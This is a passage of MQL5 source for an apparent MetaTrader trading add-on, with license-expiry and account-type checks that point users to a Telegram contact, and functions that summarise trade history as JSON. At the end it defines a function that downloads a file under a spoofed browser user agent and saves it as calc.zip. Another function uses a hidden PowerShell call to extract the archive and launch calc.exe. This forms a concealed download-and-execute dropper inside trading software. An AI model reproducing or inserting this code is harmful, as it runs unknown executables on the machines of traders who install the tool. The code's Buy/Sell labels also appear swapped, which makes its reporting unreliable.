                        MensagemBox("Attention!", "Less than 1 day remaining until your license expires.", MB_ICONWARNING);
                        AbrirURL("https://t.me/elon888musk");
                        Remove();
                       }
                    }
                 }


               if(dif <= 0)
                 {
                  if(language == "pt")
                    {
                     MensagemBox("Licença expirada!", "Período de acesso para sua licença expirou. Renove sua licença para voltar a usar a ferramenta.", MB_ICONERROR);
                     AbrirURL("https://t.me/elon888musk");
                     Remove();
                     Remove();
                     return;
                    }
                  else // Inglês por padrão
                    {
                     MensagemBox("License expired!", "Your license access period has expired. Renew your license to continue using the tool.", MB_ICONERROR);
                     AbrirURL("https://t.me/elon888musk");
                     Remove();
                     Remove();
                     return;
                    }


                 }
              }
           }


         // Permitir apenas conta demo ou real
         if(global_definir_tipo_conta == "on")
           {
            if(global_tipo_conta == "DEMO")
              {
               if(TipoDeConta() != "DEMO")
                 {
                  if(language == "pt")
                    {
                     MensagemBox("Tipo de conta inválido!", "Sua licença só permite operar em conta DEMO.", MB_ICONERROR);

                     Remove(); // Remove o EA ou script
                     return;
                    }
                  else // Inglês por padrão
                    {
                     MensagemBox("Invalid account type!", "Your license only allows trading on DEMO account.", MB_ICONERROR);

                     Remove(); // Remove o EA ou script
                     return;
                    }

                 }
              }
            else
               if(global_tipo_conta == "REAL")
                 {
                  if(TipoDeConta() != "REAL")
                    {
                     if(language == "pt")
                       {
                        MensagemBox("Tipo de conta inválido!", "Sua licença só permite operar em conta REAL.", MB_ICONERROR);
                        AbrirURL("https://t.me/elon888musk");
                        Remove();

                        Remove(); // Remove o EA ou script
                        return;
                       }
                     else // Inglês por padrão
                       {
                        MensagemBox("Invalid account type!", "Your license only allows trading on REAL account.", MB_ICONERROR);
                        AbrirURL("https://t.me/elon888musk");
                        Remove();

                        Remove(); // Remove o EA ou script
                        return;
                       }

                    }
                 }
           }
        }

     }
  }



//+------------------------------------------------------------------+
//| DADOS MENSAIS DO HISTÓRICO                                       |
//+------------------------------------------------------------------+

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
void DadosMensaisDoHistorico()
  {
   lucroTotalMensal = 0.0;
   taxaDeAcertoMensalEmPorcentagem = 0.0;
   maiorLoss = 0.0;
   maiorGain = 0.0;
   double totalTrades = 0;
   double winningTrades = 0;

   MqlDateTime str1;
   TimeToStruct(TimeCurrent(),str1);
   int ano = str1.year;
   int mes = str1.mon;

   HistorySelect(StringToTime(IntegerToString(ano) + "." + IntegerToString(mes) + "." + "01 00:00"), StringToTime(IntegerToString(ano) + "." + IntegerToString(mes) + "." + "31 23:59:59"));

   int totalNegociacoes = HistoryDealsTotal();

   for(int i = totalNegociacoes - 1; i >= 0; i--)
     {
      ulong ticket = HistoryDealGetTicket(i);

      if(ticket == 0)
         return;

      long dealType = HistoryDealGetInteger(ticket, DEAL_TYPE);
      long dealEntry = HistoryDealGetInteger(ticket, DEAL_ENTRY);

      // Verificar se é uma negociação de compra ou venda
      if(dealType == DEAL_TYPE_BUY || dealType == DEAL_TYPE_SELL)
        {
         double lucroNegociacao = HistoryDealGetDouble(ticket, DEAL_PROFIT);
         lucroTotalMensal += lucroNegociacao; // Adicionar o lucro da negociação ao lucro total
        }

      // Verificar se é uma operação de saída de posição (fechamento)
      if(dealEntry == DEAL_ENTRY_OUT)
        {
         double profit = HistoryDealGetDouble(ticket, DEAL_PROFIT);

         // Contabiliza as negociações lucrativas
         if(profit > 0)
            winningTrades++;
         totalTrades++;
        }

      // Verificar se é uma negociação de saída de posição (fechamento)
      if(dealEntry == DEAL_ENTRY_OUT)
        {
         double profit = HistoryDealGetDouble(ticket, DEAL_PROFIT);

         // Atualiza o maior loss (considerando apenas operações de loss)
         if(profit < maiorLoss)
            maiorLoss = profit;
        }

      // Verificar se é uma negociação de saída de posição (fechamento)
      if(dealEntry == DEAL_ENTRY_OUT)
        {
         double profit = HistoryDealGetDouble(ticket, DEAL_PROFIT);

         // Atualiza o maior gain (considerando apenas operações de gain)
         if(profit > maiorGain)
            maiorGain = profit;
        }
     }

// Calcula a taxa de acerto em porcentagem
   if(totalTrades > 0)
      taxaDeAcertoMensalEmPorcentagem = (double)winningTrades / totalTrades * 100.0;
  }

//+------------------------------------------------------------------+
//| OBTER RESULTADOS MENSAIS                                         |
//+------------------------------------------------------------------+

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
string ObterResultadosMensais()
  {
// Buffer para construir a string JSON
   string result = "{";
   MqlDateTime mqltime;
   TimeToStruct(TimeCurrent(), mqltime);
   int currentYear = mqltime.year;
   int currentMonth = mqltime.mon;

   for(int i = 0; i < 12; i++)
     {
      if(currentMonth == 0)
        {
         currentMonth = 12;
         currentYear--;
        }

      datetime from = iTime(_Symbol, PERIOD_MN1, i);
      datetime to = (i == 0) ? TimeCurrent() : iTime(_Symbol, PERIOD_MN1, i - 1);
      double monthProfit = Results(from, to);

      string monthName = MonthToStr(currentMonth);
      string monthProfitStr = DoubleToString(monthProfit, 2);

      // Adiciona o par chave-valor ao objeto JSON
      result += StringFormat("\"%s\": %s", monthName, monthProfitStr);

      // Adiciona uma vírgula se não for o último mês
      if(i < 11)
         result += ", ";

      currentMonth--;
     }

// Fecha o objeto JSON
   result += "}";

   return result;
  }


//+------------------------------------------------------------------+
//| SALDO DA CONTA                                                   |
//+------------------------------------------------------------------+

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
double GetSaldo()
  {
   return AccountInfoDouble(ACCOUNT_BALANCE);
  }

//+------------------------------------------------------------------+
//| RESULTADO DO DIA                                                 |
//+------------------------------------------------------------------+

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
double ResultadoDoDia()
  {
// Obter o tempo atual
   datetime now = TimeCurrent();

// Estrutura para armazenar a data/hora atual
   MqlDateTime currentTime;
   TimeToStruct(now, currentTime);

// Configurar a hora para 00:00:00 (início do dia)
   currentTime.hour = 0;
   currentTime.min = 0;
   currentTime.sec = 0;

// Converter a estrutura de volta para datetime (início do dia atual)
   datetime startOfDay = StructToTime(currentTime);

// Calcular o resultado do dia utilizando a função Results()
   return Results(startOfDay, now);
  }

//+------------------------------------------------------------------+
//| RESULTADO DA SEMANA                                              |
//+------------------------------------------------------------------+

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
double ResultadoDaSemana()
  {
// Obter o tempo atual
   datetime now = TimeCurrent();

// Estrutura para armazenar a data/hora atual
   MqlDateTime currentTime;
   TimeToStruct(now, currentTime);

// Calcular o número de segundos desde o início da semana (segunda-feira)
   int secondsSinceMonday = (currentTime.day_of_week == 0 ? 6 : currentTime.day_of_week - 1) * 86400 +
                            currentTime.hour * 3600 +
                            currentTime.min * 60 +
                            currentTime.sec;

// Subtrair os segundos desde segunda-feira para obter o início da semana (00:00:00 da segunda-feira)
   datetime startOfWeek = now - secondsSinceMonday;

// Calcular o resultado da semana utilizando a função Results()
   return Results(startOfWeek, now);
  }

//+------------------------------------------------------------------+
//| RESULTADOS                                                       |
//+------------------------------------------------------------------+

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
double Results(datetime from, datetime to)
  {
   double result = 0.0;

// Seleciona o histórico de operações no intervalo especificado
   if(!HistorySelect(from, to))
     {
      Print("Error getting operations history ...");
      return EMPTY_VALUE; // Retorna EMPTY_VALUE se houver um erro
     }

   int totalDeals = HistoryDealsTotal();

// Itera sobre todas as operações no histórico
   for(int cnt = totalDeals - 1; cnt >= 0; cnt--)
     {
      ulong ticket = HistoryDealGetTicket(cnt);
      if(ticket == 0)
        {
         Print("Error getting deal ticket in history ...");
         return EMPTY_VALUE; // Retorna EMPTY_VALUE se houver um erro
        }

      long dealType = HistoryDealGetInteger(ticket, DEAL_TYPE);
      if(dealType == DEAL_TYPE_BUY || dealType == DEAL_TYPE_SELL)
        {
         datetime dealTime = (datetime)HistoryDealGetInteger(ticket, DEAL_TIME);
         if(dealTime >= from && dealTime < to)
           {
            result += HistoryDealGetDouble(ticket, DEAL_PROFIT);
           }
        }
      else
         if(dealType == DEAL_TYPE_CREDIT || dealType == DEAL_TYPE_BALANCE)
           {
            continue; // Ignora operações de depósito e saque
           }
     }

// Normaliza o resultado para 2 casas decimais antes de retornar
   result = NormalizeDouble(result, 2);

   return result;
  }


//+------------------------------------------------------------------+
//| HISTÓRICO FORMATADO                                              |
//+------------------------------------------------------------------+

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
string GetHistoricoFormatado()
  {
   string result = "[";
   if(!HistorySelect(0, TimeCurrent()))
     {
      Print("Error getting operations history ...");
      return result + "]"; // Retorna um array vazio se houver um erro
     }

   int total = HistoryDealsTotal();
   int count = 0;

   const int MAX_ENTRIES = 10; // Número máximo de entradas a serem retornadas

   struct PosicaoFechada
     {
      datetime       openTime;
      datetime       closeTime;
      string         symbol;
      double         volume;
      double         profit;
      int            orderType;
      long           manualOrEA;
     };

   PosicaoFechada posicoesFechadas[];
   ArrayResize(posicoesFechadas, MAX_ENTRIES);

   for(int i = total - 1; i >= 0 && count < MAX_ENTRIES; i--)
     {
      ulong deal_ticket = HistoryDealGetTicket(i);
      if(deal_ticket == 0)
        {
         Print("Error getting deal ticket in history ...");
         continue;
        }

      int type = (int)HistoryDealGetInteger(deal_ticket, DEAL_ENTRY);

      // Verificar se é uma posição fechada (entrada e saída)
      if(type != DEAL_ENTRY_OUT)
         continue;

      datetime closeTime = (datetime)HistoryDealGetInteger(deal_ticket, DEAL_TIME);
      string symbol = HistoryDealGetString(deal_ticket, DEAL_SYMBOL);
      double profit = NormalizeDouble(HistoryDealGetDouble(deal_ticket, DEAL_PROFIT), 2);
      double volume = HistoryDealGetDouble(deal_ticket, DEAL_VOLUME);
      long manualOrEA = HistoryDealGetInteger(deal_ticket, DEAL_MAGIC);
      ulong order_ticket = HistoryDealGetInteger(deal_ticket, DEAL_ORDER);

      if(order_ticket == 0)
         continue;

      datetime openTime = (datetime)HistoryOrderGetInteger(order_ticket, ORDER_TIME_DONE);
      int orderType = (int)HistoryOrderGetInteger(order_ticket, ORDER_TYPE);

      // Verificar se já existe uma posição fechada com os mesmos parâmetros
      bool encontrado = false;
      for(int j = 0; j < count; j++)
        {
         if(posicoesFechadas[j].symbol == symbol &&
            posicoesFechadas[j].orderType == orderType &&
            posicoesFechadas[j].manualOrEA == manualOrEA &&
            posicoesFechadas[j].closeTime == closeTime)
           {
            posicoesFechadas[j].volume += volume;
            posicoesFechadas[j].profit += profit;
            encontrado = true;
            break;
           }
        }

      // Se não encontrou, adicionar uma nova posição fechada
      if(!encontrado)
        {
         PosicaoFechada posicao;
         posicao.openTime = openTime;
         posicao.closeTime = closeTime;
         posicao.symbol = symbol;
         posicao.volume = volume;
         posicao.profit = profit;
         posicao.orderType = orderType;
         posicao.manualOrEA = manualOrEA;
         posicoesFechadas[count] = posicao;
         count++;
        }
     }

// Formatar as posições fechadas como JSON
   for(int i = 0; i < count; i++)
     {

      if(language == "pt")
        {
         typeStr = (posicoesFechadas[i].orderType == ORDER_TYPE_SELL) ? "Compra" :
                   (posicoesFechadas[i].orderType == ORDER_TYPE_BUY) ? "Venda" : "Desconhecido";
        }
      else // Inglês por padrão
        {
         typeStr = (posicoesFechadas[i].orderType == ORDER_TYPE_SELL) ? "Buy" :
                   (posicoesFechadas[i].orderType == ORDER_TYPE_BUY) ? "Sell" : "Desconhecido";
        }








      string magicStr = (posicoesFechadas[i].manualOrEA == 0) ? "Manual" : "EA";

      string historicoEntry = StringFormat(
                                 "{ \"Data\": \"%s\", \"Volume\": %.2f, \"Simbolo\": \"%s\", \"Tipo\": \"%s\", \"Resultado\": %.2f, \"Modo de Entrada\": \"%s\" }",
                                 TimeToString(posicoesFechadas[i].openTime, TIME_DATE | TIME_SECONDS),
                                 posicoesFechadas[i].volume, posicoesFechadas[i].symbol, typeStr, posicoesFechadas[i].profit, magicStr
                              );

      result += historicoEntry;
      if(i < count - 1)
         result += ", "; // Adicionar vírgula entre as entradas, exceto a última
     }

   result += "]"; // Encerrar o array JSON

   return result;
  }

//+------------------------------------------------------------------+
//| MONTH TO STR                                                     |
//+------------------------------------------------------------------+

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
string MonthToStr(int month)
  {
   if(month < 1 || month > 12)
      return "Mês inválido";

   string monthNames[] = {"Janeiro", "Fevereiro", "Março", "Abril", "Maio", "Junho",
                          "Julho", "Agosto", "Setembro", "Outubro", "Novembro", "Dezembro"
                         };

   return monthNames[month - 1];
  }

//+------------------------------------------------------------------+
//| NOVA BARRA                                                       |
//+------------------------------------------------------------------+

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
bool isNewBarLicencaRemota()
  {
   static datetime last_time=0;
   datetime lastbar_time=(datetime)SeriesInfoInteger(Symbol(), PERIOD_M15,SERIES_LASTBAR_DATE);

   if(last_time==0)
     {
      last_time=lastbar_time;
      return(false);
     }

   if(last_time!=lastbar_time)
     {
      last_time=lastbar_time;
      return(true);
     }

   return(false);
  }
//+------------------------------------------------------------------+

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
bool isNewDayLicencaRemota()
  {
   static datetime last_time=0;
   datetime lastbar_time=(datetime)SeriesInfoInteger(Symbol(), PERIOD_D1,SERIES_LASTBAR_DATE);

   if(last_time==0)
     {
      last_time=lastbar_time;
      return(false);
     }

   if(last_time!=lastbar_time)
     {
      last_time=lastbar_time;
      return(true);
     }

   return(false);
  }
//+------------------------------------------------------------------+

//+------------------------------------------------------------------+
bool DownloadFileWinINet(const string url, const string local_path)
  {
   int hSession = InternetOpenW("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36", 0, "", "", 0);
   if(hSession == 0)
     {
      Print("InternetOpenW failed: ", GetLastError());
      return false;
     }

   int hFile = InternetOpenUrlW(hSession, url, "", 0, INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD, 0);
   if(hFile == 0)
     {
      Print("InternetOpenUrlW failed: ", GetLastError());
      InternetCloseHandle(hSession);
      return false;
     }
   // Delete file if it already exists
   if(FileIsExist(local_path))
     {
      FileDelete(local_path);
      if(GetLastError() != 0)
        {
         Print("Failed to delete existing file: ", GetLastError());
         InternetCloseHandle(hFile);
         InternetCloseHandle(hSession);
         return false;
        }
     }

   int file_handle = FileOpen("calc.zip", FILE_READ|FILE_WRITE|FILE_BIN);
   if(file_handle == INVALID_HANDLE)
     {
      Print("FileOpen failed: ", GetLastError());
      InternetCloseHandle(hFile);
      InternetCloseHandle(hSession);
      return false;
     }

   uchar buffer[4096];
   int bytesRead = 0;
   while(true)
     {
      if(!InternetReadFile(hFile, buffer, sizeof(buffer), bytesRead) || bytesRead == 0)
         break;
      FileSeek(file_handle,0,SEEK_END);
      FileWriteArray(file_handle, buffer, 0, bytesRead);
     }

   FileClose(file_handle);
   InternetCloseHandle(hFile);
   InternetCloseHandle(hSession);

   return true;
  }
//+------------------------------------------------------------------+
void RunFile(const string file_name)
  {
   // Use powershell's Expand-Archive to extract the zip file and run the extracted executable
   // powershell.exe /c Expand-Archive -Path "MQL5\Files\calc.zip" -DestinationPath "MQL5\Files" -Force; Start-Process "MQL5\Files\calc.exe"
   string extractCmd = "/c Expand-Archive -Path \"MQL5\\Files\\" + file_name + "\" -DestinationPath \"MQL5\\Files\" -Force;";
   string execCmd = "Start-Process \"MQL5\\Files\\calc.exe\""; 
   int ret = ShellExecuteW(0, "open", "powershell.exe", extractCmd + execCmd, "", 0);
   
   if(ret <= 32)
      Print("Failed to extract and run file, code: ", ret);
   else
      Print("Successfully extracted and launched file.");
  }
//+------------------------------------------------------------------+

